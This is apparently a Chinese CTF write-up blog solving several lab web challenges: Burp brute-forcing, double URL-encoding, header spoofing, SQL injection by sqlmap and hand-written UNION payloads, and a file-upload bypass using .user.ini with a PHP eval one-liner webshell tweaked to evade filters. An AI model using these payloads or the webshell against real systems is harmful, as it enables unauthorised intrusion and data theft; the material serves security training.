## 攻防世界:ics-06

靶场开启了之后查看到一个网址，里面有很多侧边栏在url中尝试sql注入发现没有任何反应。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304092128814.webp)

那就随便点点侧边栏

结果在报表中心出现了页面跳转，并且在url上出现了新的参数。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304092130314.webp)

尝试改变id的参数，结果发现页面不存在变化

并且尝试了报错注入`?id=1 and 1=2`结果被直接过滤了

那就使用`BurpSuite`工具来进行抓包然后把id的值一直更改

**注意**如果需要使用burpsuite的多线程暴破功能，需要使用付费版，社区版没有这个功能。

直接打开burpsuite的内置浏览器，开启拦截

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304101201403.webp)

可以看见第一个包就包含了我们要破解的参数

直接右键选择第三个功能

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304101202605.webp)

然后切换到相对应的模块

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304101203304.webp)

第一步清除一下请求包中的参数，然后选中你要破解的参数，根据图片指引add就可以了

最后配置一下参数从1开始到10000结束

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304101205551.webp)

最后配置一下线程池，也就是多线程。这个功能也只有付费版才有

![](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304092124888.webp)

一切准备就绪之后就点击右上角橙色的按钮开始

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304101211974.webp)

跑完以后按照长度排序

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304101217349.webp)

发现当id=2333时返回的长度不一样，那就回到浏览器，在url中输入id=2333

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304101218259.webp)

成功得到flag！

## 攻防世界:Training-WWW-Robots

打开靶场后是一串英文，翻译过来是

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304122302848.webp)

>这个考点是网络爬虫的`Robots`协议[网络爬虫排除标准](https://zhuanlan.zhihu.com/p/342575122)

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304122305984.webp)

所以接下来就在网址栏访问这个文件就行了，这个文件上就给了页面，上面就告诉了什么可以爬

我们就输入这个目录就可以获得flag

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304122308963.webp)

<br >

## 攻防世界：PHP2

打开靶场后是这样的

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304122311467.webp)

意思是你可以对这个网站进行反驳吗？

这里引入一篇文章[index.phps](https://blog.csdn.net/loseheart157/article/details/108140659)

那如果是打开网站首页那肯定是想到`/index.php`这里我尝试了输入这个路径，结果页面没有任何的变化

那就输入`/index.phps`试试。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304122313189.webp)

果然有了回显，这就是他网站的源码.

接下来就是代码审计环节

他的第一个判断是id的值不能等于admin

但是他又要等于admin才能得到flag

不过注意这有一个特殊的函数`urldecode()`他的[作用](https://www.w3cschool.cn/php/php-urldecode.html)是将id的参数用url解码。

所以我们传递进去id的值一定是url编码后的。

不过Web浏览器的url栏会对输入的url编码自动解码一次。因为在php中有一个函数会将获取到的值再url解码一次才会进入判断。

所以我们输入的id的值要是编码两次后的值

不过我发现网上搜到的url在线编码工具都不怎么好用，所以我个人用的是线下的名字叫`CaptfEncoder`

右边的值就是将admin编码两次后的结果：

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130032608.webp)

>%2561%2564%256d%2569%256e

然后把这段数据放进url中`/index.php?id=%2561%2564%256d%2569%256e`就行了。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130034894.webp)

## 攻防世界：simple_js

这是一道很有意思的题目打开网页后，会弹出一个登录框要你输入密码。

可是奇怪的是既然需要输入密码。那为什么不用输入账号呢，不过我们也可以继续写下去。

发现无论填写什么内容都是返回这个

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130906646.webp)

这让我有些怀疑。直接右键查看源码，结果直接看到一坨js内容

<br >

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304131218058.webp)


仔细分析一下会发现这串是js源码，而且似乎没有什么跳转的页面，也就是说，无论我们输入什么都只会在这个页面。

而且代码里似乎没有“密码”的区域，感觉就像任意输入，反正最后都输出这个

不过在这个代码里发现了一串数字`70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65`怀疑是ASCII码

丢python里看看

```Python
form = '70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65'
spk = form.split(',')       # 以,作为分割转化成列表
for i in spk:               # 循环遍历列表
    j = int(i)              # 将i强制类型转化
    print(chr(j), end="")   # 以ASCII码的格式输出
```
>结果:`FAUX PASSWORD HAHA`

好家伙这不就是输入密码后的弹窗内容吗，不至于这样吧

那就还剩下一个可疑参数`\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30`

也丢Python里看看

```Python
print('\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30')
```

>结果:`55,56,54,79,115,69,114,116,107,49,50`

嘿嘿，得到一串神秘数字，应该也是ASCII码转换，那就重复上面的操作**故技重施**！

```Python
lenr = '\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30'
num = lenr.split(',')       # 将上面lenr得到的字符串以,作为分割转化成列表
for i in num:               # 循环遍历列表
    j = int(i)              # 将i强制类型转化
    print(chr(j), end='')   # 以ASCII码的格式输出
```

>结果:`786OsErtk12`

直接得到flag

## 攻防世界：xff_referer

本题所需的工具:`BurpSuite`

打开页面后发现说ip必须来自123.123.123.123

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130921554.webp)

由于题目提到了`X-Forwarded-For`和`Referer:`

所以怀疑是伪造xff和referer。先丢尽burpsuite里看看

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130926658.webp)

果然，看样子题目的意思就是让我们填充(伪造)xff和referer

X-Forwarded是填ip地址的那Referer是填我从哪来的，不知道题目的要求，就暂时说我从百度来吧

在burpsuite中抓包然后在头部随便一个地方添加以下内容

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130929737.webp)

然后再放包看看

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130929969.webp)

好家伙你是真的挑

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130930440.webp)

那就老老实实的改成我来自谷歌，顺着他。然后放包

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130931811.webp)

最后成功拿到flag！

`cyberpeace{f23f9b0f8f57f51b9a1c4182f319a9df}`

## 攻防世界：get_post

这题其实没啥难点，其实考核的地方就在于如何进行GET请求和POST请求

打开页面是这样的有一个文字指引

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304141920303.webp)

根据他的要求进行GET请求一下就行了。

GET请求的方法十分简单就是在url后面加上`?a=1`就行了

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304141921245.webp)

接下来的难点来了。

**如何才能POST请求？**

这个问题在一开始也困扰了我许久。

查看别人的wp只说了工具的名称hackbak，等一系列的工具。但是并没有给出下载方式以及使用方法

我个人目前发现的工具一共是两种，下载方法以及使用方法如下

### 第一种：使用chrome的扩展来使用`hackbar`。

`hackbar`的下载方式是使用GitHub上别人分享的，[hackbar下载链接](https://github.com/dkvirus/hackbar-for-Chrome)

本人在这里也踩了一个坑，就是如果在chrome的扩展商店里直接下载`hackbar`的话会有以下问题

* 需要付费
* 不好用功能阉割了很多

**注意：经过测试这个插件在edge浏览器中也可以使用，使用方法以及ui界面是一样的，但是下面以Chrome浏览器来演示**

所以直接在GitHub上面下载开源免费且功能强大的使用就行了

安装好之后呢按下F12打开选择这个

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304141932089.webp)

将url复制到下面的url栏中

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304141933174.webp)

在下面第一个箭头处直接就可以进行GET提交，然后下第二个箭头指向的地方填入b=2就可以进行POST传参

如下图所示的填写方式：

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304141935684.webp)

填写完毕之后按下回车就可以进行提交得到flag。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304141935365.webp)

### 第二种：使用Python脚本

首先按照题目要求get和post一个传参，构建以下代码。

```python
import requests

url = 'http://61.147.171.105:52522?a=1'		# 在url中直接进行get请求
b = {'b': 2}                                # 构建字典按照题目要求构建一个名为b值为2的post请求然后再发送
x = requests.post(url, data=b)

print(x.text)								# 将最终结果以txt文本的形式返回在终端
```

这是他终端返回的数据包的结果

```
ï»¿<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>POST&GET</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />

</head>
<body>

<h1>è¯·ç¨GETæ¹å¼æäº¤ä¸ä¸ªåä¸ºa,å¼ä¸º1çåé</h1>

<h1>è¯·åä»¥POSTæ¹å¼éä¾¿æäº¤ä¸ä¸ªåä¸ºb,å¼ä¸º2çåé</h1><h1>cyberpeace{cc63272487b69b4212824bde3ef61376}</h1>
</body>
</html>
```

可以看到他最终是以网站源码html的格式返回数据包，而我们想要的flag就在这里，成功拿到flag！



### 第三种：`Postman`

这是一个负责调试api接口的一个工具，他也可以实现这些功能，不过仅仅只是做这一题，POST请求的话，不是很方便，甚至可以说没必要，但还是有用

详情懒得写了，相对来说个人认为是最麻烦的

## 某不知名的靶场题目

### 使用sqlmap

这题所需的工具是`sqlmap`

打开靶场后查看页面信息，发现有一个名为id的参数是可变的

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192205718.webp)

我们尝试在url栏中get请求id=2，看看页面是否有回显。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192206775.webp)

可以看到页面出现了变化，这里可能存在sql注入点

将url的地址复制下来进入sqlmap跑一下，

url=`http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1`

在sqlmap中使用命令`sqlmap -u "http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1" --tables --purge`可以查看当前网页的所有数据库以及所有数据库里包含的表名



接下来我们就慢慢的看看每个数据库里的表名是什么，有没有一些比较明显可疑的表名

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192227328.webp)

随后我们在一个名叫`message`的数据库里发现一个叫做flag的表。

这一眼丁真，肯定有鬼

马上锁定这个表看看里面有什么东西

使用命令`sqlmap -u "http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1" --columns -T flag -D message`可以查看message这个库里的flag表里有什么字段

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192229539.webp)

这里也看到flag的数据类型是字符串类型，答案已经八九不离十了

再使用命令查看这个字段里的数据`sqlmap -u "http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1" --columns -T flag -D message --dump`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192231951.webp)

`flag{a1a8887793acfc199182a649e905daab}`

可以看到这里已经得到flag了，不过这个flag看起来貌似是md5加密后的

这里使用在线[MD5解密](https://www.somd5.com/)平台解密看看

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192236734.webp)

然后成功解出密文，不过是chen一下子突然不自信了...(汗颜)

### 手注解法

打开页面后发现能交互的只有url栏，而可变参数为id=1

尝试一下改变id的值

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200816101.webp)

页面发生变化，再看看他是怎么闭合语句的

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200817314.webp)

可以看到，他不是双引号闭合，因为双引号也被当成字符串传递进去了

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200817782.webp)

但是当以'结尾时发现语句闭合，页面无回显，证明单引号闭合

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200819680.webp)

按照这个规律写了一个时间延时，发现语句生效，证明我们输入进去的数据被当成代码执行了说明这里一定存在SQL注入点

现在来以这个为模板查询一下字段

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200821659.webp)

该数据库一共有三个字段因为当order by 4 时页面没有了回显，估计是报错被屏蔽了

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200822008.webp)

现在已经知道了字段数，接下来是查看库名使用命令`/?id=2' and 1=2 union select 1,database(),3 -- dwada`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200824443.webp)

得到这个数据所在的库名为message。再看看里面有什么表

`?id=2' and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema='message' -- dawdw`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200827249.webp)

这个库下有一个叫flag的表

使用limit函数发现这个表下一共有三个表，分别是flag、user、username

用法`?id=2' and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema='message' limit 0,1  -- dawdw`

通过不断改变0,1 1,1 2,1 就可以知道每个表的名字，当到3,1时页面没了回显

接下来就看看flag表里有什么字段，因为他看起来比user和username更加可能存在flag

命令`?id=2' and 1=2 union select 1,column_name,3 from information_schema.columns where table_chema='message' and table_name='flag' limit 0,1 -- dawd`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200837920.webp)

发现这个flag表下一共有两个字段分别是flag、id，那我们就继续查看flag表里的flag字段

`?id=2' and 1=2 union select 1,flag,3 from flag -- dawd`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200840482.webp)

成功拿下flag，不过这个flag是被md5加密后的，需要拿去解密一下

`flag{a1a8887793acfc199182a649e905daab}`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200841047.webp)

flag里的东西解密后就是chen所以答案是

`flag{chen}`

## 攻防世界: easyupload

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111442088.webp)

打开后是一个正常的图片文件上传题目

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111443948.webp)

先测一下他是使用黑名单还是白名单过滤

上传一个不存在的扩展名`测试.a`很明显a这个扩展名不存在，上传看看他是什么反应

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111445968.webp)

如愿以偿，或许只有GIF、JPG、PNG类型的文件才可以上传。那就已经杜绝了PHP特殊后缀的上传

上传一个带有一句话木马的jpg图马，看看存在文件头检测不

![](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111445968.webp)

还是这个结果。说明他不仅限制了扩展名的上传，同时也会检测文件里面的Hex值是否存在木马

这个时候可以试试[`.user.ini`的方法](https://blog.csdn.net/weixin_53146913/article/details/124840296#:~:text=.user.ini%20%E6%98%AFPHP%20%E6%94%AF%E6%8C%81%E5%9F%BA%E4%BA%8E%E6%AF%8F%E4%B8%AA%E7%9B%AE%E5%BD%95%E7%9A%84%20INI%20%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE%E3%80%82%20%E5%A6%82%E6%9E%9C%E4%BD%A0%E7%9A%84%20PHP,%E4%BB%A5%E6%A8%A1%E5%9D%97%E5%8C%96%E8%BF%90%E8%A1%8C%E5%9C%A8%20Apache%20%E9%87%8C%EF%BC%8C%E5%88%99%E7%94%A8.htaccess%20%E6%96%87%E4%BB%B6%E6%9C%89%E5%90%8C%E6%A0%B7%E6%95%88%E6%9E%9C%E3%80%82%20%E8%BF%99%E9%87%8C%E5%B0%B1%E5%BE%88%E6%B8%85%E6%A5%9A%E4%BA%86%EF%BC%8C.user.ini%20%E5%AE%9E%E9%99%85%E4%B8%8A%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E7%94%B1%E7%94%A8%E6%88%B7%E2%80%9C%E8%87%AA%E5%AE%9A%E4%B9%89%E2%80%9D%E7%9A%84php.ini%EF%BC%8C%E6%88%91%E4%BB%AC%E8%83%BD%E5%A4%9F%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%E8%AE%BE%E7%BD%AE%E6%98%AF%E6%A8%A1%E5%BC%8F%E4%B8%BA%E2%80%9CPHP_INI_PERDIR%20%E3%80%81%20PHP_INI_USER%E2%80%9D%E7%9A%84%E8%AE%BE%E7%BD%AE%E3%80%82)

> 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录`($_SERVER['DOCUMENT_ROOT'] 所指定的)`。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。

.user.ini 是PHP 支持基于每个目录的 INI 文件配置。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。

所以可以使用这种方法进行文件包含

在Windows环境下无法直接创建.user.ini文件。但是我们可以暂时先创建一个名为`user.ini`的文件。然后使用记事本打开进行编辑

`.user.ini`里的文件内容为：

```
GIF89a

auto_prepend_file=a.jpg
```

`GIF89a`是GIF类型的文件头

`auto_auto_prepend_file=a.jpg`中的a.jpg则是你要以php文件进行执行的文件名

编写好以上内容之后打开BurpSuite打开拦截然后抓包，将上传中的user.ini改为.user.ini即可

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111500287.webp)

还需注意的是要将数据包中的`Content-Type`改为image/jpeg再放包。否则依然会被拦截

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111503854.webp)

上传成功

接下来就是上传包含一句话木马并且文件名为a.jpg的文件

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111511926.webp)

然后在浏览器打开F12，选择到网络那一的选项之后再放包

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111513804.webp)

好家伙还是上传失败了，说明他存在检测一句话木马。

那就把`<?php eval($_REQUEST[8]); ?>`改成`<?= eval($_REQUEST[8]); ?>`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111516440.webp)

改完之后成功上传

这个时候直接看F12里的包，而不是直接去连路径

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111517950.webp)

可以看到这里出现乱码了，说明我们上传的图片成功的被当作php执行了，这个时候就可以打开蚁剑直接连接这个页面的url

连接蚁剑的速度要快，否则很快图马就会被删除得重新上传

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111521986.webp)

连接成功

flag的位置：

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111521398.webp)

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111522804.webp)

<br />

注：这题的flag是会变化的，连接后flag会立即刷新并且一旦提交flag后webshell会马上失效



## 2023(初赛)黑盾:1shell

这题顾名思义就是获取webshell，题目也没有给提示，只好自己想办法了。

打开网页是这样的，啥也没有F12大法也没用。

![image-20230525152422447](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305251524610.webp)

因为网站没有任何信息以及可交互的地方。唯一一个可以交互的就是url，可惜也没有什么可以交互的东西。

这种情况基本上就是这个网站还有其他目录了，打开御剑扫描一下他的目录

![image-20230525152924431](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305251529631.webp)

最后等他跑完路径之后发现得到两个可以正常访问的网站，其中一个文件名为1.php。

这似乎和php的一句话木马文件很像，或者说他就是一句话木马，但是我们要想办法获取他的连接密码。

这个时候经过测试一共发现有两种解题思路和方法。

1. 爆破密码(个人推荐)
2. 通过.bak备份文件查询(速度最快)

在比赛的过程中，如果使用工具爆破。在这个爆破的过程中你就可以拿这个时间去写其他的题目。两个方法各有千秋看个人喜欢

* 方法一：爆破大法(适合有把握确定是这个解法)

使用webshell密码爆破工具进行暴力猜解，然后爆破的这个过程就可以用来写其他的题目

![image-20230525153854457](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305251538623.webp)

没啥难度，就是打开软件选好爆破格式开始破解就行了，既然已经知道了连接密码，那这个事情就变得非常好办了。

密码是yv，直接用这个连接蚁剑

![image-20230525155424190](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305251554381.webp)

成功拿到flag



* 方法二：`.bak`备份文件(最稳妥)

在`/1.php`的基础上加上`.bak`后缀就可以下载到服务器的备份文件。下载好之后使用vscode打开或者记事本打开(效果都一样)然后就可以看见一串php代码

![image-20230525155941243](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305251559401.webp)

可以很明显的看到，这里包含了php的一句话木马，而我们要找的就是这个木马的连接密码。查看php源码发现他还包含了一个`cache.tmp`文件那就继续打开。

![image-20230525160205983](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305251602125.webp)

打开后只有两个字母，不出意外的话基本上就是连接密码了。打开蚁剑连接直接拿flag

